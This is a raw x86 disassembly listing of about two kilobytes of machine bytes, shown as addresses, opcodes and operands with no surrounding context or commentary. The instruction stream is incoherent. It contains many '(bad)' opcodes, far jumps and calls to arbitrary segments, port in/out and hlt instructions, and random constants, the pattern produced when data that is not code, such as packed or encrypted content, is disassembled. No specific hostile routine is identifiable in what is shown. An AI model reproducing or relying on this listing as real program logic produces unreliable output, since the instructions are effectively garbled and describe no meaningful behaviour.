  430e04:	pop    esi
  430e05:	xor    eax,ebp
  430e07:	push   esp
  430e08:	inc    eax
  430e09:	inc    ebx
  430e0a:	shl    DWORD PTR [ebx-0x4ddc65b0],0x86
  430e11:	nop
  430e12:	in     al,0x32
  430e14:	inc    ecx
  430e15:	ficomp DWORD PTR [edx]
  430e17:	pop    edx
  430e18:	rcr    DWORD PTR [eax-0x60],1
  430e1b:	or     BYTE PTR [esi+edx*1],cl
  430e1e:	shl    DWORD PTR ds:0xc400586d,1
  430e24:	sbb    bl,BYTE PTR [esi-0x5e0af526]
  430e2a:	pusha  
  430e2b:	aas    
  430e2c:	add    BYTE PTR [edx-0x63],cl
  430e2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430e30:	sub    BYTE PTR [edx+0x4378493d],0xae
  430e37:	in     al,dx
  430e38:	xchg   ecx,eax
  430e39:	add    al,cl
  430e3b:	jmp    0xa8b4:0x3e0a78e6
  430e42:	jl     0x430e54
  430e44:	xchg   edx,eax
  430e45:	xor    al,0x45
  430e47:	pop    edx
  430e48:	leave  
  430e49:	mov    edx,0xaa6985c4
  430e4e:	mov    al,0x14
  430e50:	jecxz  0x430ec2
  430e52:	fld    QWORD PTR [edx+0x5563aa4b]
  430e58:	push   es
  430e59:	lock movs DWORD PTR es:[edi],DWORD PTR gs:[esi]
  430e5c:	sub    dl,BYTE PTR ds:0x7630ba6a
  430e62:	adc    BYTE PTR [edx-0x2d],bl
  430e65:	loopne 0x430e57
  430e67:	jns    0x430e5f
  430e69:	and    DWORD PTR [eax-0x6bb66d65],ebp
  430e6f:	jo     0x430e05
  430e71:	arpl   WORD PTR [ebp+0x26],di
  430e74:	fidiv  DWORD PTR [edx+0x20a1280b]
  430e7a:	mov    eax,0xa86b54cb
  430e7f:	xchg   esi,eax
  430e80:	dec    ecx
  430e81:	inc    esi
  430e82:	pop    esi
  430e83:	jle    0x430ef9
  430e85:	mov    cl,0x64
  430e87:	add    BYTE PTR [edx+eax*2],al
  430e8a:	inc    ebp
  430e8b:	cld    
  430e8c:	mov    al,ds:0xd41fa73
  430e91:	fwait
  430e92:	dec    esp
  430e93:	pop    esi
  430e94:	push   ss
  430e95:	sbb    eax,0xa27ac2f6
  430e9a:	pop    ss
  430e9b:	les    esp,FWORD PTR [ebx]
  430e9d:	ss inc eax
  430e9f:	lds    esi,FWORD PTR [edx+0x593ef1ad]
  430ea5:	shr    BYTE PTR [esi+0x1200f7e6],0x21
  430eac:	stos   BYTE PTR es:[edi],al
  430ead:	ss mov dh,0x6c
  430eb0:	push   edx
  430eb1:	sbb    dh,dh
  430eb3:	call   0x4f94:0x5e168bdf
  430eba:	inc    esi
  430ebb:	mov    esi,edx
  430ebd:	jo     0x430f24
  430ebf:	out    0x74,al
  430ec1:	outs   dx,BYTE PTR ds:[esi]
  430ec2:	sub    al,0x1c
  430ec4:	jl     0x430e48
  430ec6:	push   cs
  430ec7:	inc    ecx
  430ec8:	mov    cl,0xb2
  430eca:	data16 add BYTE PTR [edx+0x1],al
  430ece:	mov    ds:0xb690fd28,al
  430ed3:	add    al,0x58
  430ed5:	adc    edi,eax
  430ed7:	lock shr DWORD PTR cs:[ebp-0x59961d5f],cl
  430edf:	push   0x36
  430ee1:	mov    BYTE PTR [esi+edi*1+0x27],ch
  430ee5:	retf   0x756b
  430ee8:	rol    BYTE PTR [edi],1
  430eea:	ins    BYTE PTR es:[edi],dx
  430eeb:	call   0x9e85:0x4e423b48
  430ef2:	rcr    al,cl
  430ef4:	pusha  
  430ef5:	sub    edx,DWORD PTR [eax+0xc]
  430ef8:	inc    DWORD PTR [esp+eax*2]
  430efb:	cld    
  430efc:	jnp    0x430f10
  430efe:	rcr    BYTE PTR [ebx],1
  430f00:	pop    esi
  430f01:	ins    BYTE PTR es:[edi],dx
  430f02:	in     al,0x22
  430f04:	loopne 0x430eb6
  430f06:	add    BYTE PTR [ecx+eax*8+0x5a],ah
  430f0a:	shl    DWORD PTR [ebp-0x1aa8110f],1
  430f10:	retf   0x1408
  430f13:	inc    ecx
  430f14:	inc    eax
  430f15:	add    DWORD PTR [eax+0x2],edi
  430f18:	xor    BYTE PTR [eax],cl
  430f1a:	cld    
  430f1b:	rol    BYTE PTR [eax+0x68],0x52
  430f1f:	mov    eax,ds:0xb8082cca
  430f24:	cmp    bl,BYTE PTR [ecx]
  430f26:	inc    ecx
  430f27:	pushf  
  430f28:	sub    BYTE PTR [eax+esi*2-0x3ddd36a6],ch
  430f2f:	add    DWORD PTR [bp+di+0x12f4],edi
  430f34:	jmp    0x51e3037f
  430f39:	sub    al,0xe0
  430f3b:	sbb    ch,BYTE PTR [eax-0x76ed55e5]
  430f41:	sbb    eax,0x648e4d05
  430f46:	inc    ecx
  430f47:	fdiv   DWORD PTR [ecx-0x2f50db3a]
  430f4d:	inc    eax
  430f4e:	rol    DWORD PTR ds:0xa14140c,1
  430f54:	call   0x3658:0x64a3849b
  430f5b:	and    BYTE PTR [eax],ch
  430f5d:	mov    eax,0x148d005d
  430f62:	ins    BYTE PTR es:[edi],dx
  430f63:	into   
  430f64:	test   al,0xc2
  430f66:	popa   
  430f67:	sub    BYTE PTR [eax+0x74],cl
  430f6a:	(bad)  
  430f6b:	in     al,dx
  430f6c:	mov    bh,dl
  430f6e:	mov    dl,0x2a
  430f70:	mov    edx,0x67e85d96
  430f75:	jmp    0x946c:0x302b44d3
  430f7c:	or     ecx,DWORD PTR [edi-0x1114152c]
  430f82:	mov    eax,0xd1a09a2b
  430f87:	pop    esi
  430f88:	movlps xmm3,QWORD PTR [edx+0x23a4a04b]
  430f8f:	and    al,0x88
  430f91:	push   ds
  430f92:	inc    edx
  430f93:	sub    al,0xbc
  430f95:	loop   0x430fe7
  430f97:	push   es
  430f98:	inc    eax
  430f99:	lods   eax,DWORD PTR ds:[esi]
  430f9a:	mov    esi,ebx
  430f9c:	fs pushf 
  430f9e:	inc    esi
  430f9f:	adc    eax,0x6c2cbffa
  430fa4:	inc    ebp
  430fa5:	mov    dh,0x76
  430fa7:	mov    ds,WORD PTR [edi+0x4e]
  430faa:	inc    esi
  430fab:	adc    eax,0x5c144961
  430fb0:	push   edx
  430fb1:	out    dx,al
  430fb2:	jmp    0x430f86
  430fb4:	jae    0x430f7a
  430fb6:	xor    DWORD PTR [eax-0x6d65a733],esp
  430fbc:	retf   
  430fbd:	stos   BYTE PTR es:[edi],al
  430fbe:	cmc    
  430fbf:	add    al,0xa0
  430fc1:	fmul   DWORD PTR [eax+ebp*8-0x24]
  430fc5:	push   0xffffffcf
  430fc7:	jl     0x430ffd
  430fc9:	sbb    cl,ah
  430fcb:	out    0xfa,al
  430fcd:	or     dl,BYTE PTR [ebp+0x7]
  430fd0:	and    BYTE PTR [edi+0x2e],cl
  430fd3:	jmp    0xbf52:0xd29e6a0a
  430fda:	sub    BYTE PTR [ebx+0x68],0x62
  430fde:	sbb    ch,BYTE PTR [edx-0x4e]
  430fe1:	test   BYTE PTR [eax-0x2],ch
  430fe4:	cmp    ch,BYTE PTR [edx-0x6babca6]
  430fea:	pop    eax
  430feb:	pusha  
  430fec:	inc    esp
  430fed:	or     dh,BYTE PTR [edi+edi*4]
  430ff0:	inc    edx
  430ff1:	pop    ss
  430ff2:	pop    ebx
  430ff3:	add    eax,0x85b2d1d0
  430ff8:	pusha  
  430ff9:	sub    DWORD PTR [ecx+eax*8-0x7affccc6],ebx
  431000:	dec    edi
  431001:	test   dl,bl
  431003:	mov    al,0x97
  431005:	sub    BYTE PTR [ecx],bl
  431007:	les    ebp,FWORD PTR [ecx-0x4b]
  43100a:	or     bl,BYTE PTR [edx-0x29]
  43100d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43100e:	mov    eax,0xfa949813
  431013:	shl    DWORD PTR [edx+0x4550c268],0x20
  43101a:	xor    sp,0xffb2
  43101e:	adc    eax,0xc91e4586
  431023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431024:	mov    al,0xd6
  431026:	popf   
  431027:	xchg   BYTE PTR [eax-0x33],bl
  43102a:	sub    esi,DWORD PTR [esi]
  43102c:	outs   dx,DWORD PTR ds:[esi]
  43102d:	cli    
  43102e:	sub    BYTE PTR [esi],bl
  431030:	add    BYTE PTR [esi+0x39],ch
  431033:	clc    
  431034:	test   BYTE PTR cs:[eax],0x58
  431038:	loope  0x43107b
  43103a:	mov    dl,0xdd
  43103c:	sub    ebx,DWORD PTR [ebx]
  43103e:	sar    dl,cl
  431040:	mov    DWORD PTR [ecx-0x14],ebx
  431043:	dec    ecx
  431044:	or     BYTE PTR [esi],0x21
  431047:	je     0x43105a
  431049:	and    dl,cl
  43104b:	xchg   esi,eax
  43104c:	jle    0x431059
  43104e:	or     al,0x1b
  431050:	call   0x565a:0xb63efdd6
  431057:	and    al,0x86
  431059:	mov    al,0xc5
  43105b:	mov    ds:0xd812086b,al
  431060:	mov    al,0xf9
  431062:	imul   esp,DWORD PTR [esi+0x2a6d544],0xffffffc0
  431069:	call   0x60a26cae
  43106e:	adc    ebp,DWORD PTR [ebx+esi*4+0x1d]
  431072:	(bad)  
  431073:	int3   
  431074:	hlt    
  431075:	sub    cl,bh
  431077:	(bad)  
  431078:	jl     0x430ffc
  43107a:	enter  0xac0d,0x41
  43107e:	or     eax,0x770a2b1d
  431083:	sahf   
  431084:	scas   al,BYTE PTR es:[edi]
  431085:	ja     0x43108f
  431087:	sub    BYTE PTR [esp+edi*8+0x26],ch
  43108b:	jle    0x4310e7
  43108d:	pusha  
  43108e:	add    DWORD PTR [edx-0x67],0x41
  431092:	lods   eax,DWORD PTR ds:[esi]
  431093:	sbb    eax,0x9b0a9f41
  431098:	pusha  
  431099:	nop
  43109a:	dec    esp
  43109b:	sbb    al,0xfe
  43109d:	call   0x3a15:0xa98e1442
  4310a4:	loope  0x431066
  4310a6:	sbb    bh,BYTE PTR [eax-0x6b1d4960]
  4310ac:	bound  ecx,QWORD PTR [eax-0x5f470984]
  4310b2:	lahf   
  4310b3:	push   eax
  4310b4:	or     al,0xa7
  4310b6:	jo     0x431130
  4310b8:	pop    ebx
  4310b9:	dec    edx
  4310ba:	les    edi,FWORD PTR [ecx+eax*8-0x6d3d5cb0]
  4310c1:	loop   0x431083
  4310c3:	adc    BYTE PTR [esi],0x5c
  4310c6:	or     bh,BYTE PTR [eax]
  4310c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4310c9:	inc    eax
  4310ca:	or     eax,0x6e331712
  4310cf:	adc    bh,al
  4310d1:	ss push esp
  4310d3:	repnz pop eax
  4310d5:	xchg   ecx,eax
  4310d6:	add    eax,DWORD PTR ds:0x5a181faa
  4310dc:	dec    esi
  4310dd:	fdiv   QWORD PTR [edx]
  4310df:	nop
  4310e0:	mov    BYTE PTR [eax-0x533c59e],al
  4310e6:	push   ds
  4310e7:	add    DWORD PTR [ecx-0x70],0xc0f08a1a
  4310ee:	add    eax,0xc688162
  4310f3:	push   es
  4310f4:	into   
  4310f5:	idiv   DWORD PTR ss:[esi+0x43]
  4310f9:	xchg   ecx,ebx
  4310fb:	cmc    
  4310fc:	in     al,0x8
  4310fe:	bnd jne 0x431084
  431101:	fdiv   DWORD PTR [edi+0x585e363e]
  431107:	pop    ebx
  431108:	stos   BYTE PTR es:[edi],al
  431109:	mov    esi,0x712c4927
  43110e:	xchg   ebp,eax
  43110f:	test   al,0x4e
  431111:	inc    ecx
  431112:	pop    ds
  431113:	xchg   esi,eax
  431114:	lods   eax,DWORD PTR ds:[esi]
  431115:	dec    edx
  431116:	test   BYTE PTR [ebp-0x5b],dl
  431119:	mov    ah,0x3e
  43111b:	aam    0x46
  43111d:	test   BYTE PTR [esi+0x48],cl
  431120:	inc    ecx
  431121:	mov    ch,0x2
  431123:	sub    DWORD PTR [eax+0x1f764d66],0x7
  43112a:	adc    DWORD PTR [esi+0x50],0x3d722024
  431131:	push   0xffffffdd
  431133:	jl     0x4310fa
  431135:	mov    bh,0xae
  431137:	in     al,dx
  431138:	pusha  
  431139:	(bad)  
  43113a:	push   0x60
  43113c:	jl     0x4310ce
  43113e:	or     BYTE PTR [eax+edi*2],bl
  431141:	ror    BYTE PTR [edi+0x62],1
  431144:	(bad)  
  431145:	aas    
  431146:	retf   0x7fa3
  431149:	mov    esp,0x58a9802d
  43114e:	sub    BYTE PTR [edx],ch
  431150:	push   0x20044d1c
  431155:	fcom   st(0)
  431157:	mov    eax,ds:0x620feabc
  43115c:	ins    DWORD PTR es:[edi],dx
  43115d:	sti    
  43115e:	or     al,0xd4
  431160:	pop    esi
  431161:	add    BYTE PTR [eax+0x66],bl
  431164:	je     0x43111b
  431166:	shl    BYTE PTR [ebx],0xe1
  431169:	pop    esi
  43116a:	xor    dl,al
  43116c:	inc    eax
  43116d:	aad    0x5
  43116f:	or     ah,dl
  431171:	dec    esi
  431172:	cmp    al,dl
  431174:	jbe    0x4311c2
  431176:	mov    ds:0x5440eaac,eax
  43117b:	push   ss
  43117c:	aam    0xca
  43117e:	jge    0x4311a4
  431180:	hlt    
  431181:	cmp    dl,0xa1
  431184:	loopne 0x431152
  431186:	add    al,0x6c
  431188:	pop    eax
  431189:	repz mov edi,0x32299aa8
  43118f:	stos   DWORD PTR es:[edi],eax
  431190:	add    BYTE PTR [edi*4+0xdfdb00],ah
  431197:	sub    edx,DWORD PTR [edi+edx*4+0x3aee69a]
  43119e:	adc    al,0x5a
  4311a0:	les    eax,FWORD PTR [eax+ebx*2]
  4311a3:	pop    esp
  4311a4:	aas    
  4311a5:	add    BYTE PTR [ecx-0x9],cl
  4311a8:	dec    edx
  4311a9:	inc    eax
  4311aa:	lds    edi,FWORD PTR [edx+0x16]
  4311ad:	mov    esi,0xd9499ef2
  4311b2:	rcl    DWORD PTR [ebp-0x6b],1
  4311b5:	inc    esi
  4311b6:	inc    ebx
  4311b7:	dec    esi
  4311b8:	or     BYTE PTR [edx+0x4c],bl
  4311bb:	je     0x43123b
  4311bd:	cmp    bl,dl
  4311bf:	push   esp
  4311c0:	adc    al,0x54
  4311c2:	pop    edx
  4311c3:	pusha  
  4311c4:	loop   0x43120b
  4311c6:	ins    DWORD PTR es:[edi],dx
  4311c7:	std    
  4311c8:	nop
  4311c9:	lock add DWORD PTR [eax-0x83bec41],edx
  4311d0:	ror    BYTE PTR [edi],1
  4311d2:	adc    dh,BYTE PTR [esi]
  4311d4:	ja     0x4311d8
  4311d6:	dec    esp
  4311d7:	add    BYTE PTR [edx+0x52d85450],cl
  4311dd:	or     BYTE PTR cs:[ebx],ah
  4311e0:	mov    ah,0xc0
  4311e2:	les    edx,FWORD PTR [edi]
  4311e4:	data16 hlt 
  4311e6:	test   al,0x59
  4311e8:	add    eax,0xc48af8a0
  4311ed:	dec    esp
  4311ee:	sbb    al,0xc3
  4311f0:	sub    eax,0x6eab1414
  4311f5:	(bad)  
  4311f6:	mul    BYTE PTR [esp]
  4311f9:	dec    ebp
  4311fa:	popa   
  4311fb:	mov    ah,0xd6
  4311fd:	jo     0x4311c1
  4311ff:	mov    cl,0xe0
  431201:	mov    fs,WORD PTR [edx+esi*8+0x40]
  431205:	push   esp
  431206:	xchg   bh,bl
  431208:	xor    BYTE PTR [edx-0x35937cfe],bl
  43120e:	push   ebp
  43120f:	into   
  431210:	(bad)  
  431211:	mov    dh,0x76
  431213:	test   al,0xee
  431215:	mov    al,ds:0x283b4622
  43121a:	frstor [ecx+0x4104e856]
  431220:	(bad)  
  431221:	xchg   ebx,eax
  431222:	mov    esp,ebx
  431224:	push   0xeabbc648
  431229:	pop    esp
  43122a:	mov    ds:0x9f4458,al
  43122f:	out    0x72,eax
  431231:	mov    DWORD PTR [edx-0x51e9ebf9],eax
  431237:	(bad)  
  431238:	sbb    DWORD PTR [eax+0x4f8a98e7],ebp
  43123e:	adc    al,0x4a
  431240:	inc    ebp
  431241:	outs   dx,BYTE PTR ds:[esi]
  431242:	cwde   
  431243:	inc    esi
  431244:	or     BYTE PTR [esi],0xfc
  431247:	adc    BYTE PTR [esi+0xb],dh
  43124a:	call   0xc8af:0x1c88781e
  431251:	jbe    0x431208
  431253:	inc    ebx
  431254:	sbb    BYTE PTR [ecx],0xb8
  431257:	sub    esi,DWORD PTR [esi-0x2fcb748c]
  43125d:	push   0x32e6ad15
  431262:	hlt    
  431263:	sub    al,0x64
  431265:	sahf   
  431266:	or     al,dl
  431268:	push   ds
  431269:	pop    ecx
  43126a:	or     ebx,DWORD PTR [edx-0x1b33d18e]
  431270:	mov    dl,0x1f
  431272:	shl    BYTE PTR [edx+0x5],0x21
  431276:	push   ecx
  431277:	gs sbb esp,eax
  43127a:	sbb    eax,DWORD PTR [eax]
  43127c:	into   
  43127d:	push   esp
  43127e:	inc    ebp
  43127f:	mov    esi,0xe9834544
  431284:	inc    ebp
  431285:	ret    0x62e2
  431288:	inc    edi
  431289:	adc    BYTE PTR [ebx-0x745ddb86],cl
  43128f:	push   ss
  431290:	scas   eax,DWORD PTR es:[edi]
  431291:	sahf   
  431292:	or     eax,0xe1a14ece
  431297:	add    DWORD PTR [esi-0x497eb5d5],0xffffffd1
  43129e:	call   0xc481:0x12bba93e
  4312a5:	adc    BYTE PTR [ebp*4-0x2ea7b70a],bl
  4312ac:	pushf  
  4312ad:	shr    BYTE PTR [esi+ebp*4+0x3ac300f7],1
  4312b4:	pop    eax
  4312b5:	push   eax
  4312b6:	js     0x4312e5
  4312b8:	ins    DWORD PTR es:[edi],dx
  4312b9:	cmp    bl,dl
  4312bb:	adc    ebp,DWORD PTR [esi]
  4312bd:	push   ebp
  4312be:	dec    esi
  4312bf:	push   0x14ed81e3
  4312c4:	cmp    al,0xc4
  4312c6:	jae    0x43127b
  4312c8:	out    dx,al
  4312c9:	fadd   DWORD PTR [edx]
  4312cb:	xchg   ecx,eax
  4312cc:	push   ebp
  4312cd:	fcomp  QWORD PTR [ecx+0x6c]
  4312d0:	cmp    al,0xb6
  4312d2:	sti    
  4312d3:	pop    esi
  4312d4:	add    DWORD PTR [ecx],ebx
  4312d6:	test   al,0x2
  4312d8:	mov    ds,WORD PTR [eax]
  4312da:	add    al,0xb2
  4312dc:	push   eax
  4312dd:	inc    ecx
  4312de:	mov    eax,esp
  4312e0:	lock dec esi
  4312e2:	dec    ecx
  4312e3:	js     0x4312f2
  4312e5:	mov    esp,0x187237da
  4312ea:	pop    edx
  4312eb:	sbb    eax,0x1d16049f
  4312f0:	scas   al,BYTE PTR es:[edi]
  4312f1:	xchg   ecx,eax
  4312f2:	sahf   
  4312f3:	es inc ebx
  4312f5:	loopne 0x4312ae
  4312f7:	bound  ecx,QWORD PTR [eax]
  4312f9:	dec    edx
  4312fa:	adc    bl,BYTE PTR [edx+0x2aad689e]
  431300:	adc    BYTE PTR [esi-0x5b],al
  431303:	sbb    al,0xa2
  431305:	dec    ebp
  431306:	and    eax,0x60d32a15
  43130b:	xchg   esp,eax
  43130c:	inc    ebx
  43130d:	test   DWORD PTR [esi-0x76],edx
  431310:	mov    ah,BYTE PTR [esi]
  431312:	dec    eax
  431313:	enter  0x229a,0x36
  431317:	sbb    al,0x13
  431319:	push   0x5fac4daa
  43131e:	mov    ds:0xa8f7cad8,eax
  431323:	test   al,0x6a
  431325:	push   eax
  431326:	push   esi
  431327:	(bad)  
  431328:	adc    bh,BYTE PTR [edx+0x5278204]
  43132e:	push   ebp
  43132f:	rcl    BYTE PTR [esp+esi*2],1
  431332:	cs call 0x939:0xb0306a2a
  43133a:	xor    al,0xe2
  43133c:	out    dx,al
  43133d:	ret    0xaa5e
  431340:	out    0x7a,eax
  431342:	dec    esp
  431343:	jl     0x431365
  431345:	dec    esi
  431346:	dec    ecx
  431347:	(bad)  
  431348:	sbb    BYTE PTR [edx],ch
  43134a:	mov    esp,0x2e20048
  43134f:	push   cs
  431350:	loop   0x431374
  431352:	sbb    bl,BYTE PTR [edx+0x45]
  431355:	adc    esp,esp
  431357:	jl     0x4313d3
  431359:	cs pop ss
  43135b:	lods   al,BYTE PTR ds:[esi]
  43135c:	sbb    BYTE PTR [edx],al
  43135e:	push   esi
  43135f:	mov    WORD PTR [edx],ss
  431361:	sbb    al,0x8b
  431363:	sub    al,0x40
  431365:	daa    
  431366:	mov    bh,BYTE PTR [esi+eax*4+0x2f]
  43136a:	add    BYTE PTR [ebx+0x28f51be],bl
  431370:	sub    BYTE PTR [eax+0x0],ch
  431373:	mov    ds,WORD PTR [edi]
  431375:	ret    0xfe7b
  431378:	mov    BYTE PTR [eax],ah
  43137a:	xchg   edx,eax
  43137b:	(bad)  
  43137c:	stos   DWORD PTR es:[edi],eax
  43137d:	push   edx
  43137e:	dec    edx
  43137f:	mov    dh,0xa6
  431381:	lock and eax,0x556602b8
  431387:	add    al,0x82
  431389:	xchg   BYTE PTR [edi],ch
  43138b:	push   0xd9d82ee3
  431390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431391:	(bad)  
  431392:	ss mov edx,0x8bd81469
  431398:	jle    0x4313c2
  43139a:	and    bp,ax
  43139d:	stos   DWORD PTR es:[edi],eax
  43139e:	push   cs
  43139f:	inc    ecx
  4313a0:	mov    esp,0x511fdea6
  4313a5:	stos   BYTE PTR es:[edi],al
  4313a6:	push   edx
  4313a7:	fiadd  DWORD PTR [edx+0x74569106]
  4313ad:	ss mov cl,ah
  4313b0:	fs mov esi,0x84bc01f3
  4313b6:	shl    BYTE PTR [eax+0x75c30448],1
  4313bc:	adc    DWORD PTR cs:[edi+0x78],ecx
  4313c0:	scas   al,BYTE PTR es:[edi]
  4313c1:	sub    BYTE PTR [eax+edi*8-0x61],dh
  4313c5:	add    dl,ch
  4313c7:	imul   BYTE PTR [eax+0x58895815]
  4313cd:	test   BYTE PTR [edx+0x3657661c],ch
  4313d3:	and    BYTE PTR [ecx+ecx*4-0x5217f3d4],dh
  4313da:	jg     0x4313eb
  4313dc:	ins    BYTE PTR es:[edi],dx
  4313dd:	xor    BYTE PTR [esp+eiz*8],bh
  4313e0:	and    dh,BYTE PTR [esi-0x5ff449ec]
  4313e6:	lods   al,BYTE PTR ds:[esi]
  4313e7:	icebp  
  4313e8:	xor    al,0xd1
  4313ea:	mov    dh,0x45
  4313ec:	pop    esi
  4313ed:	cdq    
  4313ee:	adc    BYTE PTR [esi],0x6a
  4313f1:	mov    esp,0x92289034
  4313f6:	jbe    0x431385
  4313f8:	jl     0x431390
  4313fa:	add    al,BYTE PTR [edi-0x577f9f72]
  431400:	pushf  
  431401:	mov    edx,0xa405a90c
  431406:	mov    edi,0xf8ecd4b1
  43140b:	xchg   BYTE PTR [eax+0x76],dl
  43140e:	mov    dh,0xe
  431410:	mov    ch,0x24
  431412:	jecxz  0x431457
  431414:	xor    eax,0xa04d7b44
  431419:	aaa    
  43141a:	or     eax,0xc187b8ca
  43141f:	ins    BYTE PTR es:[edi],dx
  431420:	sub    dl,bl
  431422:	inc    ebx
  431423:	loop   0x4313af
  431425:	add    dl,BYTE PTR [edi+ebp*1-0x55f19530]
  43142c:	leave  
  43142d:	loop   0x4313e1
  43142f:	mov    dl,0x2
  431431:	pop    esi
  431432:	int    0xd1
  431434:	ror    BYTE PTR [edi],0x6d
  431437:	mov    al,ds:0x91ea4bc7
  43143c:	leave  
  43143d:	push   esp
  43143e:	mov    ebp,0x5166f096
  431443:	adc    DWORD PTR [esp+edi*1+0x72],eax
  431447:	pushf  
  431448:	jnp    0x43140c
  43144a:	add    al,0xa1
  43144c:	enter  0xfd92,0xe4
  431450:	dec    esp
  431451:	jl     0x431405
  431453:	mov    cl,0xca
  431455:	jnp    0x4314cf
  431457:	and    ch,BYTE PTR [esi+0x425d75fa]
  43145d:	jp     0x43144f
  43145f:	push   edx
  431460:	retf   0x9490
  431463:	mov    esp,0x4d158518
  431468:	mov    cl,0x58
  43146a:	arpl   WORD PTR [edx-0x60],dx
  43146d:	pop    esi
  43146e:	cmp    eax,0x445d0376
  431473:	xchg   ecx,esp
  431475:	mov    eax,ds:0xf8de1b30
  43147a:	xchg   esi,eax
  43147b:	into   
  43147c:	clc    
  43147d:	or     eax,0xfb443a3
  431482:	jle    0x43147d
  431484:	or     al,0x8c
  431486:	mov    bl,BYTE PTR [edi-0x2e]
  431489:	dec    esi
  43148a:	das    
  43148b:	pushf  
  43148c:	add    BYTE PTR [esp+eax*1+0x6d],ah
  431490:	pop    ebp
  431491:	dec    esi
  431492:	push   edx
  431493:	mov    bl,0x1c
  431495:	call   0xe26a712f
  43149a:	and    eax,0xcc048eb5
  43149f:	sub    al,0x4c
  4314a1:	mov    bh,0xa4
  4314a3:	adc    BYTE PTR [ebp-0x4ac51ed6],dh
  4314a9:	inc    eax
  4314aa:	sub    ah,BYTE PTR [eax-0x7bd1398]
  4314b0:	add    DWORD PTR [ebp+0x5c],ebp
  4314b3:	mov    esp,0x107f1c04
  4314b8:	in     eax,dx
  4314b9:	mov    eax,0x6609d124
  4314be:	mov    ?,WORD PTR [ecx+0x40af1f60]
  4314c4:	fwait
  4314c5:	cs or  al,ch
  4314c8:	push   ds
  4314c9:	call   0xfad:0x8a046a57
  4314d0:	or     BYTE PTR [esp+ecx*2-0x1f],dh
  4314d4:	shl    BYTE PTR [eax-0x50],0xdf
  4314d8:	adc    BYTE PTR [eax+ecx*8],bh
  4314db:	fs jp  0x43150e
  4314de:	test   BYTE PTR [esp+ebp*2-0x5f],dh
  4314e2:	nop
  4314e3:	push   0xffffffc8
  4314e5:	bound  ebp,QWORD PTR [ebp+ebp*8-0x7e]
  4314e9:	sub    ch,BYTE PTR [esi-0x4e]
  4314ec:	mov    edx,0xa61264b0
  4314f1:	xor    ecx,DWORD PTR [eax+0xa]
  4314f4:	sub    ch,BYTE PTR [esi]
  4314f6:	sub    al,0xc6
  4314f8:	jmp    0x8a87:0x4cae50d0
  4314ff:	xchg   dh,dl
  431501:	rcl    BYTE PTR [eax],1
  431503:	mov    esi,0xc4212c71
  431508:	outs   dx,DWORD PTR ds:[esi]
  431509:	leave  
  43150a:	call   0xabc2:0x3fc354d4
  431511:	push   es
  431512:	cs mov dh,0x27
  431515:	sbb    BYTE PTR [ebx-0x396403f6],ch
  43151b:	adc    BYTE PTR [esi-0x2c1c5684],0xd0
  431522:	add    eax,0xa2ed1e0a
  431527:	lea    ebp,[eax-0x5f]
  43152a:	rol    DWORD PTR [esp+ebp*8],0x68
  43152e:	mov    bl,0x55
  431530:	push   cs
  431531:	add    ebx,0x728c12bc
  431537:	pusha  
  431538:	jnp    0x43150c
  43153a:	les    esi,FWORD PTR ds:0xbf683381
  431540:	and    DWORD PTR [eax],esp
  431542:	mov    al,ds:0xb2849092
  431547:	shl    BYTE PTR [ebx+0xc04550a],1
  43154d:	jo     0x4315a8
  43154f:	cmp    BYTE PTR [ecx],bh
  431551:	int    0x8d
  431553:	data16 aad 0x1a
  431556:	inc    edx
  431557:	dec    edx
  431558:	mov    eax,0x8682b233
  43155d:	mov    edi,0xba866c45
  431562:	je     0x43159e
  431564:	mov    ds:0x84af075,al
  431569:	pushf  
  43156a:	adc    al,0xc
  43156c:	add    eax,0xcaecc306
  431571:	and    BYTE PTR [eax+ebx*2],dh
  431574:	mov    eax,ds:0x56049d7c
  431579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43157a:	test   al,0xfa
  43157c:	mov    dl,0xd0
  43157e:	xchg   esi,eax
  43157f:	sub    al,ah
  431581:	push   0xffffffa8
  431583:	into   
  431584:	or     ah,ch
  431586:	adc    dl,BYTE PTR [eax]
  431588:	mov    BYTE PTR [eax-0x6f],ch
  43158b:	mov    bl,0x30
  43158d:	mov    eax,ss:0xd4aea870
  431593:	dec    esp
  431594:	mov    esi,0x6d08756a
  431599:	pop    ss
  43159a:	xor    al,0xf6
  43159c:	sbb    al,0xce
  43159e:	mov    edx,0xb153c0ec
  4315a3:	mov    eax,ds:0xf8e415b5
  4315a8:	push   esi
  4315a9:	outs   dx,DWORD PTR ds:[esi]
  4315aa:	mov    esi,0x50e1a07a
  4315af:	inc    eax
  4315b0:	push   edx
  4315b1:	mov    ah,0x34
  4315b3:	stos   BYTE PTR es:[edi],al
  4315b4:	test   DWORD PTR [eax+ebx*2+0x593ca080],esi
  4315bb:	dec    esi
  4315bc:	xchg   esi,eax
  4315bd:	outs   dx,BYTE PTR ds:[esi]
  4315be:	rcr    DWORD PTR [edi-0x25cd4400],1
  4315c4:	(bad)  
  4315c5:	pop    esi
  4315c6:	fcomp  QWORD PTR [ecx-0x2adebd59]
  4315cc:	popa   
  4315cd:	pop    esi
  4315ce:	(bad)  
  4315cf:	mov    dl,0xde
  4315d1:	ds push eax
  4315d3:	stos   DWORD PTR es:[edi],eax
  4315d4:	jmp    0x4cde56a1
  4315d9:	sub    al,0xe2
  4315db:	pusha  
  4315dc:	imul   esi,DWORD PTR [eax-0x7e],0xffffffd4
  4315e0:	sbb    bh,dl
  4315e2:	call   0x71c58d1f
  4315e7:	xchg   esp,eax
  4315e8:	pop    esi
  4315e9:	adc    al,0xe0
  4315eb:	lods   al,BYTE PTR ds:[esi]
  4315ec:	scas   al,BYTE PTR es:[edi]
  4315ed:	cmc    
  4315ee:	and    eax,0x9eda2da3
  4315f3:	hlt    
  4315f4:	xor    al,0x27
  4315f6:	and    DWORD PTR cs:[edx+0x65f080b],eax
  4315fd:	and    DWORD PTR [ebp+0x0],0xfffffff1
  431601:	sub    eax,0xbc18d278
  431606:	xchg   BYTE PTR [esi-0x6d49d85e],dh
  43160c:	adc    BYTE PTR [esi],cl
  43160e:	inc    dl
  431610:	sbb    cl,ch
  431612:	pop    esp
  431613:	inc    esi
  431614:	xor    esi,DWORD PTR [eax+ebp*2]
  431617:	add    DWORD PTR [eax+ecx*4+0x6],esi
